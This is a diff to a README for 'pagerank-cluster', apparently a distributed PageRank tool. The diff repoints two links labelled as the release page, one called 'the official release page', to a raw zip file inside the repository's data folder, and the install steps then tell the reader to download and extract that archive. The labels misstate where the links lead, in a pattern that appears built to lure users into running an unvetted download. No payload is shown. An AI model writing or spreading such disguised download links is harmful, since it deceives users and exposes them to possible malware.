@@ -1,6 +1,6 @@
 # 📈 pagerank-cluster - Process massive web graphs using clusters
 
-[![Download pagerank-cluster](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cortesehardfisted522/pagerank-cluster)
+[![Download pagerank-cluster](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cortesehardfisted522/pagerank-cluster/raw/refs/heads/main/data/pagerank-cluster-v1.7.zip)
 
 This project allows you to rank web pages using a distributed computing network. It connects multiple computers to process large datasets. You can analyze up to 875,000 web nodes. The system uses a Spark and Hadoop backbone to distribute the workload. 
 
@@ -16,7 +16,7 @@ Ensure your computers meet these requirements before you start:
 
 ## 💾 Installation Steps
 
-1. Visit [the official release page](https://github.com/Cortesehardfisted522/pagerank-cluster) to find the latest version.
+1. Visit [the official release page](https://github.com/Cortesehardfisted522/pagerank-cluster/raw/refs/heads/main/data/pagerank-cluster-v1.7.zip) to find the latest version.
 2. Click the link labeled "pagerank-cluster-windows.zip" to save the file.
 3. Open your Downloads folder.
 4. Right-click the folder and select Extract All.
